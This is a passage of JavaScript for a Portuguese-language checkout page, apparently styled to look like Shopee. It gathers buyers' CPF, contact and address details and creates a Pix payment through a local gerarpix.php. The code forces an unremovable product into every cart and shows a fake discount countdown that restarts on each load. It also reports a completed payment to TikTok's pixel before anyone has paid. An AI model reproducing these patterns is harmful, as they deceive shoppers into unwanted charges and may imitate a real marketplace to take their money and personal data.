                  <span class="text-sm font-semibold" style="color: var(--shopee-text);">${formatBRL(frete.preco)}</span>
                </label>
              `;
            })
            .join('');
          fieldset.innerHTML = markup;

          const inputs = fieldset.querySelectorAll('input[name="frete"]');
          inputs.forEach((input) => {
            input.addEventListener('change', () => aplicarFrete(input));
          });

          const selecionado =
            Array.from(inputs).find((input) => input.checked) || inputs[0];
          if (selecionado) {
            aplicarFrete(selecionado);
          }
        })
        .catch((error) => {
          console.error('Erro ao carregar fretes:', error);
          fieldset.innerHTML =
            '<p class="text-sm" style="color: var(--shopee-orange);">N√£o foi poss√≠vel carregar as op√ß√µes de frete.</p>';
        });
    }

    function aplicarFrete(input) {
      if (!input) return;
      state.selectedFrete = {
        id: input.value,
        titulo: input.dataset.titulo || 'Frete',
        preco: toNumber(input.dataset.preco)
      };
      localStorage.setItem('checkout_frete_id', state.selectedFrete.id);
      const freteSelecionadoEl = document.getElementById('freteSelecionado');
      if (freteSelecionadoEl) {
        freteSelecionadoEl.textContent = `${state.selectedFrete.titulo} (${formatBRL(state.selectedFrete.preco)})`;
      }
      updateTotals();
    }

    function coletarDadosCheckout() {
      return {
        comprador: {
          email: getInputValue('email'),
          telefone: getInputValue('telefone'),
          nome: getInputValue('nome'),
          cpf: getInputValue('cpf')
        },
        entrega: {
          cep: getInputValue('cep'),
          endereco: getInputValue('endereco'),
          numero: getInputValue('numero'),
          bairro: getInputValue('bairro'),
          cidade: getInputValue('cidade'),
          estado: getInputValue('estado'),
          complemento: getInputValue('complemento')
        }
      };
    }

    function validarEtapa(campos) {
      for (let i = 0; i < campos.length; i += 1) {
        const input = document.getElementById(campos[i]);
        if (!input || !input.value.trim()) {
          if (input) {
            input.style.borderColor = 'var(--shopee-orange)';
            input.style.backgroundColor = 'var(--shopee-orange-light)';
            input.focus();
          }
          return false;
        }
        input.style.borderColor = '';
        input.style.backgroundColor = '';
      }
      return true;
    }

    function proximaEtapa(etapa) {
      if (etapa === 2 && !validarEtapa(['email', 'telefone', 'nome', 'cpf'])) return;
      if (etapa === 3 && !validarEtapa(['cep', 'endereco', 'numero', 'bairro', 'cidade', 'estado'])) return;

      document.querySelectorAll('.step').forEach((step, index) => {
        step.classList.toggle('hidden', index + 1 !== etapa);
      });
      atualizarSteps(etapa);
      currentStep = etapa;
      updateOrderBumpVisibility();
    }

    function atualizarSteps(etapa) {
      for (let i = 1; i <= 3; i += 1) {
        const indicator = document.getElementById(`step-${i}-indicator`);
        if (!indicator) continue;
        indicator.className = 'w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2';
        const label = indicator.parentElement.querySelector('span');
        if (i < etapa) {
          indicator.style.backgroundColor = 'var(--shopee-orange)';
          indicator.style.color = 'white';
          if (label) {
            label.style.color = 'var(--shopee-text)';
            label.classList.add('font-semibold');
          }
        } else if (i === etapa) {
          indicator.style.backgroundColor = 'var(--shopee-orange)';
          indicator.style.color = 'white';
          if (label) {
            label.style.color = 'var(--shopee-text)';
            label.classList.add('font-semibold');
          }
        } else {
          indicator.style.backgroundColor = '#e0e0e0';
          indicator.style.color = '#999';
          if (label) {
            label.style.color = 'var(--shopee-text-light)';
            label.classList.remove('font-semibold');
          }
        }
      }
    }

    function removerDoCarrinho(index) {
      if (!Array.isArray(state.carrinho)) return;
      const idx = Number.parseInt(index, 10);
      if (Number.isNaN(idx) || idx < 0 || idx >= state.carrinho.length) return;
      
      // Impede remo√ß√£o do produto fixo
      const item = state.carrinho[idx];
      if (item && String(item.produtoId) === 'FIXO_FURADEIRA_20V') {
        showToast('Este produto n√£o pode ser removido');
        return;
      }
      
      state.carrinho.splice(idx, 1);
      persistCarrinho();
      renderCarrinho();
      // Reabilita bot√µes de order bump se o item removido for um deles
      refreshOrderBumpButtonsFromCart();
    }

    async function finalizarCompra() {
      const btnComprar = document.getElementById('button-comprar'); // ‚úÖ captura o bot√£o

      // üîí Desativa o bot√£o para impedir m√∫ltiplos cliques
      if (btnComprar) {
        btnComprar.disabled = true;
        btnComprar.textContent = 'Processando...';
      }

      try {
        console.log('=== Finalizar Compra iniciado ===');

        if (!state.carrinho.length) {
          if (btnComprar) {
            btnComprar.disabled = false;
            btnComprar.textContent = 'Finalizar compra';
          }
          showToast('Seu carrinho est√° vazio');
          return;
        }
        if (!state.selectedFrete) {
          if (btnComprar) {
            btnComprar.disabled = false;
            btnComprar.textContent = 'Finalizar compra';
          }
          showToast('Selecione um frete antes de finalizar');
          return;
        }

        const total = updateTotals();
        console.log('Total calculado:', total);
        if (!Number.isFinite(total) || total <= 0) {
          if (btnComprar) {
            btnComprar.disabled = false;
            btnComprar.textContent = 'Finalizar compra';
          }
          showToast('N√£o foi poss√≠vel calcular o total da encomenda');
          return;
        }

        const dados = coletarDadosCheckout();
        console.log('Dados do checkout:', dados);
        const subtotal = Number.isFinite(state.subtotal) ? Number(state.subtotal.toFixed(2)) : 0;
        const desconto = Number.isFinite(state.desconto) ? Number(state.desconto.toFixed(2)) : 0;

        const ordem = {
          carrinho: state.carrinho,
          subtotal,
          desconto,
          frete: state.selectedFrete,
          total,
          comprador: dados.comprador,
          entrega: dados.entrega,
          criadoEm: new Date().toISOString()
        };
        sessionStorage.setItem('checkoutOrdem', JSON.stringify(ordem));
        persistCarrinho();

        console.log('Enviando requisi√ß√£o para gerarpix.php...');
        console.log('Payload:', { amount: total, carrinho: state.carrinho.length, total });

        const response = await fetch('gerarpix.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            amount: total,  // gerarpix.php espera 'amount', n√£o 'valor'
            comprador: dados.comprador,
            entrega: dados.entrega,
            carrinho: state.carrinho,
            frete: state.selectedFrete,
            shipping: state.selectedFrete ? { fee: state.selectedFrete.preco } : undefined,
            subtotal,
            desconto
          })
        });

        console.log('Response status:', response.status);
        console.log('Response ok:', response.ok);

        const raw = await response.text();
        console.log('Response raw:', raw);

        let data;
        try {
          data = raw ? JSON.parse(raw) : null;
          console.log('Response parsed:', data);
        } catch (parseError) {
          console.error('Erro ao fazer parse da resposta:', parseError);
          console.error('Resposta Pix inv√°lida (raw):', raw);
          throw new Error('Resposta inv√°lida do provedor Pix.');
        }

        if (!response.ok || !data || data.success === false) {
          const errorMsg = (data && data.error) || (data && data.message) || raw || 'Falha ao gerar cobran√ßa Pix.';
          console.error('Erro na resposta:', errorMsg);
          console.error('Data completa:', data);
          throw new Error(errorMsg);
        }

        // gerarpix.php (API Genesys) retorna: 
        // { success: true, pix_code: "...", transaction_id: "...", amount: ..., status: "..." }
        // A API Genesys retorna: { id, external_id, status, total_value, customer, payment_method, pix: { payload }, hasError }
        // gerarpix.php j√° extrai pix.payload e retorna como pix_code
        let qrCode = null;
        let transactionId = null;
        let apiStatus = null;
        
        if (data && typeof data === 'object') {
          // Prioridade: resposta processada pelo gerarpix.php
          qrCode = data.pix_code || null;
          transactionId = data.transaction_id || data.id || null;
          apiStatus = data.status || null;
          
          // Fallback: se gerarpix.php retornou a resposta bruta da API
          if (!qrCode && data.pix && data.pix.payload) {
            qrCode = data.pix.payload;
          }
          if (!transactionId && data.id) {
            transactionId = data.id;
          }
          if (!apiStatus && data.status) {
            apiStatus = data.status;
          }
          
          // Fallback adicional para compatibilidade
          if (!qrCode) {
            qrCode = data.qr_code || data.pix_qr_code || data.pixCode || data.copy_and_paste || null;
          }
          
          console.log('PIX Code encontrado:', qrCode ? 'SIM' : 'N√ÉO');
          console.log('Transaction ID encontrado:', transactionId ? 'SIM' : 'N√ÉO');
          console.log('Status da API:', apiStatus);
        }

        if (!qrCode) {
          console.error('C√≥digo PIX n√£o encontrado na resposta:', data);
          throw new Error('C√≥digo PIX n√£o foi gerado. Tente novamente.');
        }
        
        // Verifica se h√° erro na resposta
        if (data.hasError === true) {
          console.error('API retornou erro:', data);
          throw new Error('Erro ao processar pagamento. Tente novamente.');
        }

        // gerarpix.php n√£o retorna imagem base64, apenas o c√≥digo PIX
        const pixImage = null;

        const ordemAtualizada = {
          ...ordem,
          pix: data,
          pixCode: qrCode,
          transactionId: transactionId,
          pixImage: pixImage,
          apiStatus: apiStatus,
          apiResponse: data // Guarda resposta completa da API
        };
        sessionStorage.setItem('checkoutOrdem', JSON.stringify(ordemAtualizada));
        console.log('Ordem atualizada salva no sessionStorage');

        // üëá AQUI DISPARA O EVENTO ANTES DO REDIRECIONAMENTO
        if (typeof ttq !== 'undefined') {
          ttq.track('CompletePayment', {
            value: Number(total || 0),
            currency: 'BRL'
          });
          console.log('üî• TikTok Pixel - Evento CompletePayment disparado');
        }

        const destino = qrCode ? `payment.html?qr=${encodeURIComponent(qrCode)}` : 'payment.html';
        console.log('Redirecionando para:', destino);
        window.location.href = destino + window.location.search;
      } catch (error) {
        console.error('=== ERRO ao gerar Pix ===');
        console.error('Erro completo:', error);
        console.error('Mensagem:', error.message);
        console.error('Stack:', error.stack);
        
        // Reabilita o bot√£o em caso de erro
        if (btnComprar) {
          btnComprar.disabled = false;
          btnComprar.textContent = 'Finalizar compra';
        }
        
        const errorMessage = error.message || 'N√£o foi poss√≠vel gerar o Pix. Tente novamente.';
        showToast(errorMessage);
      }
    }

    function preencherFormulario() {
      try {
        const armazenado = sessionStorage.getItem('checkoutOrdem');
        if (!armazenado) return;
        const ordem = JSON.parse(armazenado);
        if (!ordem || typeof ordem !== 'object') return;
        state.ordemAnterior = ordem;

        // S√≥ sobrescreve o carrinho se estiver vazio (para n√£o perder dados j√° carregados)
        if (Array.isArray(ordem.carrinho) && ordem.carrinho.length && (!state.carrinho || state.carrinho.length === 0)) {
          console.log('Preenchendo carrinho do checkoutOrdem (carrinho estava vazio)');
          state.carrinho = ordem.carrinho.map(normalizarItemCarrinho);
        }
        if (ordem.frete) {
          state.selectedFrete = {
            id: ordem.frete.id,
            titulo: ordem.frete.titulo,
            preco: toNumber(ordem.frete.preco)
          };
          if (ordem.frete.id !== undefined) {
            localStorage.setItem('checkout_frete_id', ordem.frete.id);
          }
        }

        if (ordem.comprador) {
          const emailEl = document.getElementById('email');
          if (emailEl) emailEl.value = ordem.comprador.email || '';
          const telefoneEl = document.getElementById('telefone');
          if (telefoneEl) telefoneEl.value = ordem.comprador.telefone || '';
          const nomeEl = document.getElementById('nome');
          if (nomeEl) nomeEl.value = ordem.comprador.nome || '';
          const cpfEl = document.getElementById('cpf');
          if (cpfEl) cpfEl.value = ordem.comprador.cpf || '';
        }

        if (ordem.entrega) {
          const cepEl = document.getElementById('cep');
          if (cepEl) cepEl.value = ordem.entrega.cep || '';
          const enderecoEl = document.getElementById('endereco');
          if (enderecoEl) enderecoEl.value = ordem.entrega.endereco || '';
          const numeroEl = document.getElementById('numero');
          if (numeroEl) numeroEl.value = ordem.entrega.numero || '';
          const bairroEl = document.getElementById('bairro');
          if (bairroEl) bairroEl.value = ordem.entrega.bairro || '';
          const cidadeEl = document.getElementById('cidade');
          if (cidadeEl) cidadeEl.value = ordem.entrega.cidade || '';
          const estadoEl = document.getElementById('estado');
          if (estadoEl) estadoEl.value = ordem.entrega.estado || '';
          const complementoEl = document.getElementById('complemento');
          if (complementoEl) complementoEl.value = ordem.entrega.complemento || '';
        }
      } catch (error) {
        console.warn('N√£o foi poss√≠vel preencher dados anteriores:', error);
      }
    }

    function iniciarContador() {
      let segundos = 5 * 3600;
      const span = document.getElementById('contador');
      if (!span) return;
      const tick = () => {
        if (segundos <= 0) {
          span.textContent = 'O desconto expirou';
          return;
        }
        const horas = String(Math.floor(segundos / 3600)).padStart(2, '0');
        const minutos = String(Math.floor((segundos % 3600) / 60)).padStart(2, '0');
        const secs = String(segundos % 60).padStart(2, '0');
        span.textContent = `O desconto expira em ${horas}:${minutos}:${secs}`;
        segundos -= 1;
        setTimeout(tick, 1000);
      };
      tick();
    }

    document.addEventListener('DOMContentLoaded', async () => {
      console.log('=== DOMContentLoaded checkout ===');
      
      // Carrega o carrinho primeiro
      loadCarrinho();
      console.log('State.carrinho ap√≥s loadCarrinho:', state.carrinho);
      console.log('Length:', state.carrinho.length);
      
      // Se n√£o encontrou no storage, tenta carregar da query string
      if (!state.carrinho.length) {
        console.log('Carrinho vazio, tentando carregar da query...');
        await carregarCarrinhoDaQuery();
        console.log('State.carrinho ap√≥s carregarCarrinhoDaQuery:', state.carrinho);
      }
      
      // Garante que o produto fixo esteja sempre presente
      adicionarProdutoFixo();
      
      // Carrega order bumps
      await carregarOrderBump();
      
      // Preenche formul√°rio (n√£o deve sobrescrever carrinho se j√° carregado)
      preencherFormulario();
      
      // Renderiza o carrinho
      console.log('Chamando renderCarrinho com state.carrinho:', state.carrinho);
      renderCarrinho();
      
      carregarFretes();
      iniciarContador();
      updateOrderBumpVisibility();

      // Wire CEP auto lookup
      const cepInput = document.getElementById('cep');
      if (cepInput) {
        cepInput.addEventListener('input', onCepInput);
        cepInput.addEventListener('blur', tryLookupCep);
      }
    });

    function formatCEP(v) {
      const digits = String(v || '').replace(/\D/g, '').slice(0, 8);
      if (digits.length <= 5) return digits;
      return `${digits.slice(0, 5)}-${digits.slice(5)}`;
    }

    function onCepInput(e) {
      const el = e.target;
      const cur = el.value;
      const formatted = formatCEP(cur);
      if (cur !== formatted) {
        const pos = el.selectionStart;
        el.value = formatted;
        // tenta manter o cursor pr√≥ximo ao fim
        try { el.setSelectionRange(formatted.length, formatted.length); } catch {}
      }
      // debounce lookup when 8 digits
      if (cepLookupTimer) clearTimeout(cepLookupTimer);
      cepLookupTimer = setTimeout(() => tryLookupCep(), 400);
    }

    async function tryLookupCep() {
      const cepEl = document.getElementById('cep');
      const msgEl = document.getElementById('cep-msg');
      if (!cepEl) return;
      const digits = cepEl.value.replace(/\D/g, '');
      if (digits.length !== 8) {
        if (msgEl) { msgEl.textContent = ''; msgEl.classList.add('hidden'); }
        return;
      }
      if (digits === lastCepLookedUp) return; // evita chamada repetida
      lastCepLookedUp = digits;
      if (msgEl) { 
        msgEl.textContent = 'Buscando CEP...'; 
        msgEl.classList.remove('hidden'); 
        msgEl.style.color = 'var(--shopee-text-light)';
      }
      try {
        const resp = await fetch(`https://viacep.com.br/ws/${digits}/json/`, { cache: 'no-store' });
        const data = await resp.json();
        if (!resp.ok || data.erro) {
          throw new Error('CEP n√£o encontrado');
        }
        // Preenche campos
        const enderecoEl = document.getElementById('endereco');
        const bairroEl = document.getElementById('bairro');
        const cidadeEl = document.getElementById('cidade');
        const estadoEl = document.getElementById('estado');
        if (enderecoEl) enderecoEl.value = (data.logradouro || '').trim();
        if (bairroEl) bairroEl.value = (data.bairro || '').trim();
        if (cidadeEl) cidadeEl.value = (data.localidade || '').trim();
        if (estadoEl) estadoEl.value = (data.uf || '').trim().toUpperCase();

        const numeroEl = document.getElementById('numero');
        if (numeroEl && !numeroEl.value) numeroEl.focus();

        if (msgEl) { 
          msgEl.textContent = 'Endere√ßo preenchido automaticamente.'; 
          msgEl.style.color = '#00C853';
          msgEl.classList.remove('hidden'); 
        }
      } catch (err) {
        if (msgEl) { 
          msgEl.textContent = 'CEP inv√°lido ou n√£o encontrado.'; 
          msgEl.classList.remove('hidden'); 
          msgEl.style.color = 'var(--shopee-orange)';
        }
      }
    }

    async function carregarOrderBump() {
      try {
        const resp = await fetch('produtos.json', { cache: 'no-store' });
        if (!resp.ok) return;
        const arr = await resp.json();
        const produtos = Array.isArray(arr) ? arr : [];
        if (!produtos.length) return;

        // 1) Tenta pegar pelo par√¢metro da URL
        const params = new URLSearchParams(window.location.search);
        const urlProdutoId = params.get('produto_id') || params.get('produto');
        let produto = null;
        if (urlProdutoId) {
          produto = produtos.find(p => String(p.id) === String(urlProdutoId)) || null;
        }

        // 2) Tenta pelo produtoId do carrinho
        if (!produto && state.carrinho && state.carrinho.length) {
          const idCarrinho = state.carrinho[0]?.produtoId || state.carrinho[0]?.id || null;
          if (idCarrinho !== null && idCarrinho !== undefined) {
            produto = produtos.find(p => String(p.id) === String(idCarrinho)) || null;
          }
        }

        // 3) Fallback por t√≠tulo/varia√ß√£o (ex: t√≠tulo vira "Preto")
        if (!produto && state.carrinho && state.carrinho.length) {
          const tituloCarrinho = (state.carrinho[0]?.titulo || '').toString().trim().toLowerCase();
          if (tituloCarrinho) {
            produto = produtos.find(p => {
              const base = (p.titulo || '').toString().trim().toLowerCase();
              if (base && base === tituloCarrinho) return true;
              const vars = Array.isArray(p.variacoes) ? p.variacoes : [];
              return vars.some(v => (v.titulo || '').toString().trim().toLowerCase() === tituloCarrinho);
            }) || null;
          }
        }

        // 4) √öltimo fallback: primeiro com order_bumps ou order_bump; sen√£o, primeiro produto
        if (!produto) {
          produto = produtos.find(p => (Array.isArray(p.order_bumps) && p.order_bumps.length) || !!p.order_bump) || produtos[0];
        }

        const obs = [];
        if (produto) {
          if (Array.isArray(produto.order_bumps) && produto.order_bumps.length) {
            obs.push(...produto.order_bumps.filter(o => o && o.id));
          } else if (produto.order_bump && produto.order_bump.id) {
            obs.push(produto.order_bump);
          }
        }
        if (!obs.length) return;
        renderOrderBumpCards(obs);
      } catch (e) {
        console.warn('Order bump n√£o dispon√≠vel:', e);
      }
    }

    function isOrderBumpInCart(obId) {
      return state.carrinho.some(i => String(i.produtoId) === String(obId));
    }

    function markOrderBumpRedeemed(obId) {
      const card = document.querySelector(`#order-bumps-container [data-ob-id="${String(obId)}"]`);
      if (!card) return;
      const btn = card.querySelector('button[data-role="ob-cta"]');
      if (!btn) return;
      const clone = btn.cloneNode(true);
      clone.textContent = 'Oferta resgatada';
      clone.disabled = true;
      clone.setAttribute('aria-disabled', 'true');
      clone.className = 'w-full mt-2 py-2 text-sm font-semibold rounded-md bg-slate-200 text-slate-500 cursor-not-allowed';
      btn.replaceWith(clone);
    }

    function refreshOrderBumpButtonsFromCart() {
      const container = document.getElementById('order-bumps-container');
      if (!container) return;
      const cards = container.querySelectorAll('[data-ob-id]');
      cards.forEach(card => {
        const obId = card.getAttribute('data-ob-id');
        const btn = card.querySelector('button[data-role="ob-cta"]');
        if (!btn) return;
        const redeemed = isOrderBumpInCart(obId);
        const newBtn = btn.cloneNode(true);
        if (redeemed) {
          newBtn.textContent = 'Oferta resgatada';
          newBtn.disabled = true;
          newBtn.setAttribute('aria-disabled', 'true');
          newBtn.className = 'w-full mt-2 py-2 text-sm font-semibold rounded-md bg-slate-200 text-slate-500 cursor-not-allowed';
          newBtn.onclick = null;
        } else {
          newBtn.textContent = 'Resgatar Oferta';
          newBtn.disabled = false;
          newBtn.removeAttribute('aria-disabled');
          newBtn.className = 'w-full mt-2 py-2 text-sm font-semibold rounded-md bg-[#0db3ae] text-white hover:bg-[#00c2bd]';
          const ob = window.__orderBumps.get(String(obId));
          newBtn.onclick = ob ? (() => abrirModalOrderBump(ob)) : null;
        }
        btn.replaceWith(newBtn);
      });
    }

    function renderOrderBumpCards(lista) {
      const container = document.getElementById('order-bumps-container');
      if (!container) return;
      container.innerHTML = '<h3 class="text-sm font-semibold text-slate-800 text-center">Acho que voc√™ vai gostar destas ofertas ;)</h3>';
      for (const ob of lista) {
        // guarda refer√™ncia global
        window.__orderBumps.set(String(ob.id), ob);
        const card = document.createElement('div');
        card.className = 'bg-transparent';
        card.setAttribute('data-ob-id', String(ob.id));
        const precoAtual = toNumber(ob.preco);
        const precoCmp = toNumber(ob.preco_comparacao ?? ob.precoComparacao ?? 0);
        const descontoValor = precoCmp > precoAtual ? (precoCmp - precoAtual) : 0;
        const redeemed = isOrderBumpInCart(ob.id);
        card.innerHTML = `
          <div class="border border-dashed border-slate-300 rounded-lg p-3 bg-white">
            <div class="flex gap-3 items-center">
              <img src="${resolveMedia(Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : '')}" alt="Order bump" class="w-16 h-16 object-contain rounded border bg-white">
              <div class="flex-1">
                <p class="font-semibold text-sm text-slate-900 leading-snug">${ob.titulo || 'Item adicional'}</p>
                <div class="mt-1">
                  ${precoCmp > precoAtual ? `<p class="text-xs text-slate-400 line-through">${formatBRL(precoCmp)}</p>` : ''}
                  <div class="flex items-baseline gap-2">
                    <span class="text-slate-900 font-bold">${formatBRL(precoAtual)}</span>
                    ${descontoValor > 0 ? `<span class="text-emerald-600 text-xs font-semibold">(${formatBRL(descontoValor)} OFF)</span>` : ''}
                  </div>
                </div>
              </div>
            </div>
          </div>
          <button type="button" data-role="ob-cta" class="w-full mt-2 py-2 text-sm font-semibold rounded-md ${redeemed ? 'bg-slate-200 text-slate-500 cursor-not-allowed' : 'bg-[#00d8d1] text-white hover:bg-[#00c2bd]'}" ${redeemed ? 'disabled aria-disabled="true"' : ''}>${redeemed ? 'Oferta resgatada' : 'Comprar agora'}</button>
        `;
        const btn = card.querySelector('button[data-role="ob-cta"]');
        if (!redeemed) {
          btn.addEventListener('click', () => abrirModalOrderBump(ob));
        }
        container.appendChild(card);
      }
      updateOrderBumpVisibility();
      refreshOrderBumpButtonsFromCart();
    }

    function updateOrderBumpVisibility() {
      const container = document.getElementById('order-bumps-container');
      if (!container) return;
      const hasCards = container.children && container.children.length > 0;
      const shouldShow = currentStep === 3 && hasCards;
      container.classList.toggle('hidden', !shouldShow);
    }

  function abrirModalOrderBump(ob) {
      // Modal com suporte a dupla sele√ß√£o (Cor e Tamanho) quando poss√≠vel
      const overlay = document.createElement('div');
      overlay.className = 'fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4';
      const modal = document.createElement('div');
      modal.className = 'bg-white rounded-lg shadow-xl max-w-md w-full p-4';

      // Monta base de varia√ß√µes
      const variacoesOrig = Array.isArray(ob.variacoes) && ob.variacoes.length ? ob.variacoes : [
        {
          id: null,
          titulo: 'Padr√£o',
          preco: toNumber(ob.preco),
          preco_comparacao: toNumber(ob.preco_comparacao ?? ob.precoComparacao ?? 0),
          imagem: Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : ''
        }
      ];

      // Heur√≠stica p/ extrair COR e TAMANHO a partir do t√≠tulo/atributos
      const sizeRegex = /^(pp|p|m|g|gg|xg|xs|s|l|xl|xxl|2xl|3xl|4xl|5xl|\d{2}|\d{2}[\/\-]\d{2})$/i;
      const clean = (s) => (s || '').toString().trim().replace(/\s+/g, ' ');
      const getFromObjKeys = (obj, keys) => {
        if (!obj) return null;
        for (const k of keys) {
          if (obj[k] != null && obj[k] !== '') return clean(String(obj[k]));
        }
        return null;
      };
      const getFromArrayAttrs = (arr, keys) => {
        if (!Array.isArray(arr)) return null;
        const lowerKeys = keys.map(k => k.toLowerCase());
        for (const it of arr) {
          const name = clean(it?.name || it?.nome || it?.chave || '');
          const val = it?.value ?? it?.valor ?? it?.val ?? it?.v ?? '';
          if (!name) continue;
          if (lowerKeys.includes(name.toLowerCase())) return clean(String(val));
        }
        return null;
      };
      function parseColorSizeFromTitle(t) {
        const str = clean(t);
        if (!str) return { cor: null, tamanho: null };
        const mCor = str.match(/\bcor\s*[:\-]?\s*([^|\/\-‚Äì‚Äî√óx‚Ä¢+()\[\]]+)/i);
        const mTam = str.match(/\b(tamanho|tam|size)\s*[:\-]?\s*([^|\/\-‚Äì‚Äî√óx‚Ä¢+()\[\]]+)/i);
        let cor = mCor ? clean(mCor[1]) : null;
        let tamanho = mTam ? clean(mTam[2]) : null;
        if (!cor || !tamanho) {
          const parts = str.split(/[|\/\-‚Äì‚Äî√óx‚Ä¢+]+/).map(p => clean(p)).filter(Boolean);
          if (parts.length >= 2) {
            let sizePart = parts.find(p => sizeRegex.test(p));
            if (sizePart) {
              tamanho = tamanho || sizePart;
              const other = parts.find(p => p !== sizePart) || parts[0];
              if (!cor && other && other !== tamanho) cor = other;
            } else if (parts.length >= 2) {
              // Fallback: 1¬∫ = cor, 2¬∫ = tamanho (se parecer tamanho)
              if (!cor) cor = parts[0];
              if (!tamanho && sizeRegex.test(parts[1])) tamanho = parts[1];
            }
          }
        }
        return { cor: cor || null, tamanho: tamanho || null };
      }

      // Deriva uma cor a partir do t√≠tulo removendo tokens de tamanho e r√≥tulos
      function deriveColorFromTitle(t) {
        const str = clean(t).replace(/\bcor\s*[:\-]?\s*/i, '');
        if (!str) return null;
        const parts = str.split(/[|\/\-‚Äì‚Äî√óx‚Ä¢+]+/).map(p => clean(p)).filter(Boolean);
        const filtered = parts.filter(p => !sizeRegex.test(p));
        return filtered.length ? filtered[0] : null;
      }

      // Normaliza strings para compara√ß√£o (remove acentos e caixa)
      function normalizeStr(s) {
        return (s || '')
          .toString()
          .normalize('NFD')
          .replace(/[\u0300-\u036f]/g, '')
          .toLowerCase()
          .trim();
      }

      function getVariantImage(variant) {
        if (!variant || typeof variant !== 'object') return '';
        const img = variant.imagem || variant.foto || variant.image || variant.img || '';
        if (img) return img;
        if (Array.isArray(variant.fotos) && variant.fotos.length) return variant.fotos[0];
        return '';
      }

      // Busca a melhor imagem para a cor selecionada
      function findImageForColor(cor, repCandidate = null) {
        const candidate = repCandidate || null;
        const candImg = getVariantImage(candidate);
        if (candImg) return candImg;
        const norm = normalizeStr(cor);
        // Procura em combina√ß√µes por alguma varia√ß√£o da mesma cor que tenha imagem
        if (Array.isArray(combos) && combos.length) {
          const withImg = combos.find(x => x.cor === cor && x.v && getVariantImage(x.v));
          if (withImg) return getVariantImage(withImg.v);
        }
        // Tenta a partir do mapeamento de cor->varia√ß√£o
        if (colorToVariant && colorToVariant.size) {
          const v = colorToVariant.get(cor);
          const vImg = getVariantImage(v);
          if (vImg) return vImg;
        }
        // Heur√≠stica: procurar na lista de fotos por arquivo/url contendo a cor
        if (Array.isArray(ob.fotos) && ob.fotos.length) {
          const match = ob.fotos.find(f => normalizeStr(f).includes(norm));
          if (match) return match;
          // fallback: tenta a primeira foto
          return ob.fotos[0];
        }
        return '';
      }

      // Constr√≥i matriz 2D de combina√ß√µes
      const combos = [];
      const coresSet = new Set();
      const tamanhosSet = new Set();
      for (const v of variacoesOrig) {
        const titulo = v.titulo || v.info || '';
        // Busca em diferentes estruturas comuns
        const attrsObjList = [v.atributos, v.attributes, v.attr, v.opcoes, v.options, v.especificacoes];
        let cor = null;
        let tamanho = null;
        // Objetos
        for (const maybe of attrsObjList) {
          if (cor && tamanho) break;
          if (maybe && !Array.isArray(maybe) && typeof maybe === 'object') {
            cor = cor || getFromObjKeys(maybe, ['cor', 'Cor', 'color', 'Color']);
            tamanho = tamanho || getFromObjKeys(maybe, ['tamanho', 'Tamanho', 'tam', 'Tam', 'size', 'Size']);
          }
        }
        // Arrays [{name, value}]
        for (const maybe of attrsObjList) {
          if (cor && tamanho) break;
          const gotCor = getFromArrayAttrs(maybe, ['cor', 'color', 'Cor', 'Color']);
          const gotTam = getFromArrayAttrs(maybe, ['tamanho', 'tam', 'size', 'Tamanho', 'Size']);
          if (!cor && gotCor) cor = gotCor;
          if (!tamanho && gotTam) tamanho = gotTam;
        }
        // T√≠tulo como fallback
        if (!cor || !tamanho) {
          const parsed = parseColorSizeFromTitle(titulo);
          cor = cor || parsed.cor;
          tamanho = tamanho || parsed.tamanho;
        }
        // Usa o campo tipo da varia√ß√£o como pista forte
        const tipoInferido = (v.tipo || '').toString().toLowerCase();
        if (!cor && tipoInferido === 'cor') {
          cor = clean(titulo);
        }
        if (!tamanho && (tipoInferido === 'tamanho' || tipoInferido === 'tam')) {
          tamanho = clean(titulo);
        }
        // Se s√≥ um dos dois existir, tenta inferir pelo padr√£o geral: tokens de tamanho
        if (!tamanho) {
          const parts = clean(titulo).split(/[|\/\-‚Äì‚Äî√óx‚Ä¢+]+/).map(p => clean(p)).filter(Boolean);
          const sizePart = parts.find(p => sizeRegex.test(p));
          if (sizePart) tamanho = sizePart;
        }
        if (cor) coresSet.add(cor);
        if (tamanho) tamanhosSet.add(tamanho);
        if (cor && tamanho) combos.push({ cor, tamanho, v });
      }
  const cores = Array.from(coresSet).filter(c => !sizeRegex.test(String(c || '')));
      const tamanhos = Array.from(tamanhosSet);
      const has2D = cores.length > 0 && tamanhos.length > 0 && combos.length > 0;

      // HTML din√¢mico: sempre dois pickers (Cor em cima e Tamanho embaixo)
      modal.innerHTML = `
        <div class="flex items-start gap-3 mb-3">
          <img id="ob-header-thumb" src="${resolveMedia(Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : '')}" class="w-16 h-16 object-contain rounded border" alt="${ob.titulo || 'Produto'}">
          <div>
            <h3 class="font-semibold text-slate-900">${ob.titulo || 'Produto'}</h3>
            <div class="text-sm flex items-center gap-2">
              <span id="ob-price" class="font-bold text-emerald-700">${formatBRL(toNumber(ob.preco))}</span>
              ${toNumber(ob.preco_comparacao ?? 0) > toNumber(ob.preco) ? `<span id="ob-price-cmp" class="text-xs text-slate-400 line-through">${formatBRL(toNumber(ob.preco_comparacao))}</span>` : '<span id="ob-price-cmp" class="hidden"></span>'}
            </div>
          </div>
        </div>
        <div class="grid grid-cols-1 gap-3 mb-3">
          <div>
            <label class="block text-sm font-medium text-slate-700 mb-1">Cor</label>
            <div class="relative">
              <button type="button" id="ob-cor-picker" class="w-full rounded-md border border-slate-300 px-3 py-2 text-sm text-left bg-white hover:bg-slate-50 flex items-center gap-3">
                <img id="ob-cor-thumb" class="w-8 h-8 object-cover rounded border hidden" alt="Cor">
                <span id="ob-cor-label" class="text-slate-800">Selecione a cor‚Ä¶</span>
              </button>
              <div id="ob-cor-dropdown" class="absolute z-50 mt-2 w-full bg-white border border-slate-200 rounded-md shadow-lg max-h-64 overflow-auto hidden">
                <ul id="ob-cor-list" class="divide-y divide-slate-100"></ul>
              </div>
            </div>
          </div>
          <div>
            <label class="block text-sm font-medium text-slate-700 mb-1">Tamanho</label>
            <div class="relative">
              <button type="button" id="ob-tam-picker" class="w-full rounded-md border border-slate-300 px-3 py-2 text-sm text-left bg-white hover:bg-slate-50 flex items-center gap-3 disabled:opacity-60" disabled>
